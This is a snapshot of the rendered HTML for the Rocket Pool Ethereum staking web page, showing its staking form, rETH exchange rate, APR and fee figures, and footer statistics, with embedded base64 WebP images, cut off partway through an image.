+    </style></head><body><noscript><strong>We're sorry but the Rocket Pool website doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><h1 style="display:none">Rocket Pool is a decentralised staking protocol providing liquid &amp; node staking products for the Ethereum (ETH) ecosystem.</h1><div id="app" data-v-app=""><div class="header"><div class="relative" data-headlessui-state=""><div class="center thin"><div class="flex items-center justify-between lg:justify-start lg:space-x-10"><div class="flex justify-start lg:w-0 lg:flex-1"><a href="/" class="router-link-active router-link-exact-active" aria-current="page"><span class="sr-only">Rocket Pool</span><img class="h-14 w-14" src="data:image/webp;base64,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" width="112" height="112" alt="Rocket Pool - Your friendly decentralised Ethereum staking protocol" title="Rocket Pool"></a><!----></div><div class="-my-2 -mr-[2px]"><button class="inline-flex items-center justify-center rounded-md bg-white dark:bg-dark hover:dark:bg-white p-2 text-gray hover:bg-gray-light hover:text-black cursor-pointer" id="headlessui-popover-button-v-0" type="button" aria-expanded="false" data-headlessui-state=""><div class="flex flex-row items-center justify-end"><!----></div><span class="sr-only">Open menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button><!----></div></div></div><!----></div><div hidden="" style="position: fixed; height: 0px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; display: none;"></div></div><div class="center thin"><div class="w-full text-gray"><div class="mx-auto"><div class="flex h-full flex-col justify-between rounded-2xl bg-white p-3 dark:bg-dark-bg md:p-6"><div class="relative"><div class="mb-1 flex items-end justify-between px-2"><div><span class="text-xxs sm:text-base">Stake ETH</span><span class="invisible ml-2 mr-1 inline-flex cursor-pointer items-center rounded-full bg-secondary px-2.5 py-0.5 text-sm text-white hover:bg-secondary-highlight md:text-base">Approve</span></div><div><span class="text-xxs sm:text-base"> Balance: 0 <span>ETH</span></span><span class="ml-2 mr-1 inline-flex cursor-pointer items-center rounded-full bg-secondary px-2.5 py-0.5 text-sm text-white hover:bg-secondary-highlight md:text-base">Max</span></div></div><div class="relative"><div class="pointer-events-none absolute inset-y-0 left-0 flex items-center px-3 py-3 pl-1"><div class="absolute flex h-10 w-10 items-center justify-center rounded-full"><svg viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-8 w-8"><circle cx="22" cy="22" r="22" fill="#748FB5"></circle><path d="M22.4879 5.54686V5.56248C22.5036 5.64058 22.5036 5.7343 22.5036 5.82801V17.0898C22.4879 17.1523 22.4411 17.1679 22.3942 17.1992C22.0662 17.3553 21.7538 17.4959 21.4258 17.6365C20.9728 17.8396 20.5042 18.0582 20.0513 18.2613L18.4112 19.011C17.9582 19.2141 17.5053 19.4171 17.0679 19.6202C16.5368 19.8701 15.9901 20.1044 15.4591 20.3543C15.0061 20.5574 14.5531 20.7761 14.0845 20.9791C13.7097 21.1509 13.3348 21.3071 12.9755 21.4789C12.9443 21.4946 12.9131 21.5102 12.8818 21.5102C12.8662 21.5102 12.8662 21.5102 12.8506 21.4946L13.2723 20.7917C14.0845 19.4484 14.8811 18.1207 15.6934 16.7774C16.5525 15.3404 17.4272 13.9034 18.2862 12.4664C19.0828 11.1387 19.8951 9.81104 20.6917 8.48336C21.2696 7.51494 21.8631 6.54652 22.4411 5.5781C22.4567 5.54686 22.4723 5.53124 22.4723 5.5H22.4879C22.4723 5.51562 22.4879 5.53124 22.4879 5.54686Z" fill="#F3F3F3"></path><path d="M32.0768 21.4944L32.0924 21.51L29.7963 22.869L22.58 27.1331C22.5488 27.1488 22.5176 27.1644 22.5019 27.18C22.4551 27.18 22.4551 27.1331 22.4551 27.1175V26.9769V17.324C22.4551 17.2771 22.4551 17.2146 22.4707 17.1678C22.4863 17.1053 22.5332 17.1209 22.58 17.1365C22.7831 17.2302 23.0018 17.324 23.2048 17.4177C23.814 17.6988 24.4232 17.98 25.0323 18.2455C25.5634 18.4798 26.0788 18.7297 26.6099 18.964C27.141 19.1983 27.6721 19.4482 28.2031 19.6825C28.6561 19.8856 29.1247 20.1043 29.5777 20.3073C30.0306 20.5104 30.4992 20.7291 30.9522 20.9321C31.3114 21.0883 31.6707 21.2601 32.03 21.4163C32.03 21.4632 32.0456 21.4788 32.0768 21.4944Z" fill="#8A8DA7"></path><path d="M22.486 36.8802C22.486 36.8958 22.4704 36.9114 22.4704 36.927H22.4547C22.4547 36.8958 22.4235 36.8802 22.4079 36.8489C21.4395 35.49 20.471 34.1155 19.5026 32.7566C18.5186 31.3664 17.5189 29.9607 16.5349 28.5705C15.5821 27.2272 14.6137 25.8683 13.6609 24.525C13.4109 24.1657 13.161 23.8221 12.9111 23.4629C12.8955 23.4316 12.8799 23.416 12.8486 23.3691C12.8955 23.3691 12.9267 23.4004 12.9424 23.416C14.3013 24.2126 15.6446 25.0092 17.0035 25.8058C18.5654 26.7274 20.1118 27.6489 21.6738 28.5705L22.4704 29.0391C22.5016 29.0703 22.5016 29.1016 22.5016 29.1328V36.6615C22.5016 36.7396 22.5016 36.8177 22.486 36.8802Z" fill="#F3F3F3"></path><path d="M12.833 21.5258V21.5102C13.3328 21.2916 13.817 21.0573 14.3169 20.8386C14.9573 20.5418 15.5977 20.2607 16.2381 19.9639C16.7223 19.7452 17.2221 19.5109 17.7064 19.2922C18.4249 18.9642 19.1277 18.6518 19.8463 18.3238C20.3305 18.1051 20.8147 17.8865 21.3145 17.6522C21.6581 17.496 22.0174 17.3398 22.361 17.1836C22.3923 17.168 22.4391 17.1523 22.4547 17.1211C22.4704 17.1211 22.4704 17.1367 22.4547 17.1523V27.0708C22.4547 27.1177 22.4391 27.1646 22.4704 27.1958C22.4391 27.2427 22.4079 27.1958 22.3923 27.1802C22.2517 27.1021 22.1111 27.024 21.9705 26.9303C18.9559 25.1496 15.9257 23.3534 12.9111 21.5727C12.8955 21.5571 12.8642 21.5415 12.833 21.5258Z" fill="#C5C8D9"></path><path d="M32.0456 23.3691H32.0612C32.0612 23.4004 32.03 23.4316 32.0143 23.4629C29.1403 27.5084 26.2663 31.5695 23.3923 35.615C23.0955 36.0367 22.7831 36.4584 22.4863 36.8802C22.4707 36.8646 22.4707 36.8489 22.4707 36.8333V36.7396V29.164V29.0235C23.1267 28.633 23.7671 28.2581 24.4232 27.8676C26.9536 26.3681 29.4839 24.8843 31.9987 23.3848C32.0143 23.4004 32.03 23.3848 32.0456 23.3691Z" fill="#C5C8D9"></path><path d="M22.4707 17.1523V17.1211V17.0274V5.68746C22.4707 5.6406 22.4551 5.60936 22.4863 5.5625C25.6571 10.8263 28.8279 16.0746 31.9831 21.3384C32.0143 21.3853 32.0612 21.4477 32.0768 21.5102C31.8581 21.4321 31.6551 21.3228 31.452 21.2291C31.2021 21.1197 30.9366 20.9948 30.6867 20.8854C30.5305 20.8073 30.3586 20.7448 30.2024 20.6667C29.9369 20.5418 29.6714 20.4325 29.4058 20.3075C29.2496 20.245 29.0934 20.1669 28.9372 20.0888L27.9063 19.6202C27.7345 19.5421 27.5627 19.464 27.3753 19.3859L26.6255 19.0579C26.4693 18.9954 26.3131 18.9173 26.1569 18.8392L25.126 18.3707C24.9542 18.2926 24.7824 18.2145 24.595 18.1364L23.8452 17.8083C23.6734 17.7302 23.5172 17.6521 23.3454 17.574C23.0486 17.4335 22.7518 17.2929 22.4395 17.1679C22.4863 17.1523 22.4707 17.1523 22.4707 17.1523Z" fill="#C5C8D9"></path></svg></div></div><input id="ethAmountToStake" name="ethAmountToStake" placeholder="0.00" type="number" step="any" autocomplete="off" class=""><div class="absolute inset-y-0 right-2 z-10 flex w-72 items-center justify-end px-1"><span class="text-base sm:text-xl"><span class="relative -top-[1px] pr-1 text-xl sm:text-2xl">≈</span> $0.00 USD</span></div></div><div class="flex items-end justify-between pt-2 text-xxs text-red-500 sm:text-base"><div class="flex cursor-pointer flex-row pl-3"><!----><div class="relative top-[4px] flex flex-col sm:top-[0px]"><!----><!----><!----><!----><!----></div></div></div></div></div></div><div class="mx-auto -mt-4 w-fit cursor-pointer rounded-md bg-secondary p-2 text-white hover:bg-secondary-highlight relative z-30 -mt-4"><span class="sr-only">Swap Stake Direction</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3 7.5 7.5 3m0 0L12 7.5M7.5 3v13.5m13.5 0L16.5 21m0 0L12 16.5m4.5 4.5V7.5"></path></svg></div><div class="relative z-20 mx-auto -mt-4"><div class="flex h-full flex-col justify-between rounded-2xl bg-white p-3 pt-4 dark:bg-dark-bg md:p-6"><div class="relative"><div class="mb-1 flex items-end justify-between px-2"><span class="text-xxs sm:text-base">Receive rETH</span><span class="text-xxs sm:text-base">Balance: 0.00 <span>rETH</span></span></div><div class="relative"><div class="pointer-events-none absolute inset-y-0 left-0 flex items-center px-3 py-3 pl-1"><div class="absolute flex h-10 w-10 items-center justify-center rounded-full"><img src="data:image/webp;base64,UklGRs4IAABXRUJQVlA4WAoAAAAQAAAAXwAAXwAAQUxQSFQCAAABkCvbtmlb895nK7Nt27q2jeghs23bthld27Zt21jB0d5rjQ+IiAkgXqfo7H/wMzApr6QkLyno16OD+tMI6MLdb9OYhJkf9i3RAtDf5Hkuk7HgtcUgsVbdK2Gylz9eJ46pH+M0yEoMw3DGcawFf0u9GOcBqzm7wgS805+jtalMyJwt3Bxkwp7kY+B/JrDPSA7mZDGhi5fItrGTia4jkx4DaCmLDoNoIcN6BnKXZFN7UbC5EvUpYjBrhkjjxYCGS7KfQT0nwUIGdq1mhWgqNbrG4D7VYDoDvFi9CERpam1mkI3VScNUpMZOBtpKVQyqVBVzGexlyh7i+qhEuwFXxyAFPQbcVuEVsp8K5cia+hDNYtBXEu3GdpjoPbY/RDnYqrTHM/CzddBZH0B3/hG6d7/ReQWji0lGl5WPrrgUXTm+AnTFqeiyQtDF/kHn/QTdh8PoLuqjs52Ibh7lY6vpS5+w/Sfah+0Y0Vxsa4ioCllLPyJ6j+wfEZERMkeFvs24uoco0DNc30npYlxrlFEiqixSaYDKQRXlYKogNXUwWatD8YiySe25iFapRw/wvCdNK9E09NFoJZptpPlJLDdIyhAkiSTpoCoczaOlobk4lpPUO1CYkPQWGFxITksEriSvnnjmJPeSErFq15D8o/1ECh9LXJ4T5yrxujNHjGIj4rffQxFeDCGuN4bxFr2duLdL5inDlYR0CuMlyp2E3fS6Tr6mD9tJ6JEOX8vlqPrpMobEH7D28K9iKUr/Hls/mGD2mW919o1HdEZhWVlRRrTnu/O2C/sTp1ZQOCBUBgAA8B4AnQEqYABgAD5tKpJGpCIhoS8R7kiADYlqALaDpkcv2XnK2v/Vb6s970l+Kh0y/Mj54fpF/xHqAf07qOPQA8tX2X/3KgD7n3tbmPxCuS+sYGm+U59QszN8j7+pp1Q/rYVjWxJL7m86Kz0vzltAXr+H4BGMBjpEV3QZqZNggnX9jbIzD0iWY1R2ChzGzXcg7ZIFjLR0wdQX4t9BAZExbf3P8mfs0SLnoDha5NchkhFX1U39WwtATPvdSluVutLEGxmWcBNQcPSuy7AZfyLN6FChpKqkEDqq8ssLVhaSZf6TnFPavG+0dBi6e5qKyCoxyebpjeQ6o5cPJJn3xdyJmAD++bOX/5+Z/A/uls/+4FPF+zDEGNzN1lRqQnUZuxVfb1dzVuA9e5znOmW+lB52Mtxz0aLLcQIIiYOZcraWQjzczIpV57v+zrqQxi/6jXP2VkZhMElKjUtjobvsovV9K2rfTdy6qBE2ldnPCyfODxe9/4l4o6R+Mk8F4wysIeV4oepsa4biEkQhHHbPW4Z2IMMliF7kOmOfI/7a7e4P2TzP9EjOHn0AU7BCpgfhcCNmaHsN/qCp2Hwu3ROyB1PXn2pP6b0u6QWLrNac5YQ39Q70GRUYljMeuNYhpgbcSLATxqjmsu8GeKnxPwZvh1FUe1xEchYLPyn+MCwCi1Rv347K+0uvscQOLP81eImY3TZoo+MX/IMwvOzs6L3hUvruChjiXor9Ak8D+8PmBE6Z7sLhv6HwjttcZRp7JeVXN8zBw/1j4lkG/O5sPq0v3nvChhYijeuHk/z7jOueb7WW3DnT9b1fusJ8Fa3MjC1K0bp1PB4SkgW3SDla7FXkAV2g4MHGy9YSQVzW8+hhjXQfbmiDz9im+lz6Q+ZvgnCLMud5cIhO01JCsTSuviSAi+0IyMxnIyUzYq5zXpbRE/H5jwy/6v/TN+Af6c2AHL/5tKi2w6R0yf+EcJZN0Wy2MdO3fmtKTHOeR7X7tc6gDMaNdtpiDnilieI6mwBveSy6Yq/K8PrRNSVco5fcpw1aIb6qc9whVyC4lH1A+1gNO2eqw3v9S3ggWVi8PBFQ5d8tP216GXGr8y05oo46e8fq5aaGrSsmDT2nJLY58SpbbnFju7PWpWZXq1+ZyLgQBR4G3w5rKupaPxhk3F6YOHbrgEw/5/6tpI5zIcqT/qSfIHPfGRJn2rsbuTMgY6O8crISa/j1Ibtr8f9FH/a+j74uhehp+R2p2SYpxB0XpQacbsdla3rfA81VfhsEwWNKsIrsS1T+8vu4RccGjZ7sLfIwf4HTHcUlbXobr/sgC5cn4dzws9x4o0wY3CpI3goq30+iXl+8g5qhvGyOiz3+9T6GkVfsXxxGUV8ivVfx1hSIWmQuYAlf7gGb5XZf2Oi1QPaB4+JGULPBeFuDm+uYMz6fthiW7hxbDbgBymjRTpXTbChFqQLY51IwNsuoZJnHfOwNoFxz+GPsqM5Vva9Yu2lvur2dGfc0zgDYuKN/Wa63V31JxMR8FILd0R3FbGlw528WD/LDJCiUSE/VGP3rTKHZwiCcxitOOLMQ2mqC4ALbKyIo6v8SvEUZusL3pRARr2N6WU61muFa7Q8Xe2YDDguxzvKiDWGVFASvU53su4tDw0uLTx9Wgu+7EYQu+4mN/aS2p6RSyx21ajPeaZIsrppbVNlissC0UnTy8lRcxZ9AtkihqSRn4BBn6DoWzFjjGioWAn9k/ebl5ZNpRRufQNB9bzyHExeehUJnMZegGRNzKKKAzovmNYAcq/K9egRKSN0a/NGk/eMXIwJgnT99hGRjY4oq8jUyjMBx6hTXUx+oGUXTqJ5kHONsa7GwMx/JAnFJBK2e3eoi+I6ds4O0BTXkE3Oy8Z3DsKjQp6fW936CFxArbK/Nw8f2mlT9KbqO9cIAfzdLMUSrCjTLWgkFlgi1NAEbflTE/lnQHDzNtqwVNGE/Kyq+ELclEwwq44n8RhJmXzsiWf8tBWC7PTyxSnVf6nQmfflY3tQv8jrjtvxtPosHsn6KpyUzwi0bpKt9rGNiBems4LyJWnSKtT3MS7Hir+nfkAdJGLJnd+LdV/I8Rt7vWsYXN0lHW6l4D7oRiqMHPKLIRbjBzfvajKYBV6WLxFyQuw69Y7jAETHCpg/0swmsoA+AAAAA" class="h-8 w-8" alt="rETH"></div></div><div class="calculation">0.00000</div><div class="absolute inset-y-0 right-2 z-10 flex w-72 items-center justify-end px-1"><span class="text-base sm:text-xl"><span class="relative -top-[1px] pr-1 text-xl sm:text-2xl">≈</span> $0.00 USD</span></div></div></div><dl class="mt-2 px-2 text-xxs sm:text-base"><div class="border-b border-solid border-gray-light/25 py-2"><div class="flex items-center justify-between"><dt>Routing</dt><dd class="flex items-center"><div class="mr-1 inline-flex items-baseline rounded-full bg-gray px-2.5 py-0.5 text-xs font-medium text-white dark:bg-dark-light">Protocol</div><button id="headlessui-disclosure-button-v-5" type="button" aria-expanded="false" data-headlessui-state=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="hover:text-gra h-5 w-5 cursor-pointer"><path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5"></path></svg></button></dd></div><!----></div><div class="border-b border-solid border-gray-light/25 py-2"><div class="flex items-center justify-between"><dt>Exchange Rate</dt><dd class="flex items-center justify-between"><span class="pr-1">1 rETH = 1.14104 ETH</span><button id="headlessui-disclosure-button-v-7" type="button" aria-expanded="false" data-headlessui-state=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="h-5 w-5 cursor-pointer"><path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5"></path></svg></button></dd></div><!----></div><div class="border-b border-solid border-gray-light/25 py-2"><div class="flex items-center justify-between"><dt>Average Return</dt><dd class="flex items-center"><span class="pr-1 font-bold text-primary"><span class="relative -top-[1px] leading-none">≈</span> 2.54%</span><span class="pr-1">APR</span><button id="headlessui-disclosure-button-v-9" type="button" aria-expanded="false" data-headlessui-state=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="h-5 w-5 cursor-pointer"><path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5"></path></svg></button></dd></div><!----></div><div class="flex items-center justify-between py-2 pb-0"><dt>Transaction Cost</dt><dd>0.00400 ETH (<span class="relative -top-[1px] leading-none">≈</span> $11.98 <span>USD</span>)</dd></div><div class="flex items-center justify-between py-2 pb-0"><dt></dt><dd> @ <span>8</span> gwei <!----><!----><span class="ml-1 inline-flex items-center rounded-full bg-green-100 px-2.5 py-0.5 text-xxs text-green-800 sm:text-xs">Low</span></dd></div></dl></div></div><div class="h-sm:mt-2 mt-5"><button class="inline-flex w-full cursor-pointer items-center justify-center whitespace-nowrap rounded-2xl border border-transparent bg-primary px-6 py-4 text-base font-medium text-white shadow-xs hover:bg-primary-highlight"> Connect </button><div><!----></div><!----></div></div><!----></div><footer class="footer" aria-labelledby="footer-heading"><h2 id="footer-heading" class="sr-only">Footer</h2><div class="center relative px-4 py-12 thin"><div><div class="px-6 text-center text-xxs text-gray sm:px-14 sm:text-base"><span class="font-semi text-primary">665,664</span> ETH staking across <span class="font-semi text-primary">3,970</span> node operators in <span class="font-semi text-primary">149</span> regions with a node commission rate of <span class="font-semi text-primary">5%</span></div></div><div class="footer-divide pt-8"><div class="space-y-2 sm:space-y-4"><img class="m-auto h-10 w-10" src="data:image/webp;base64,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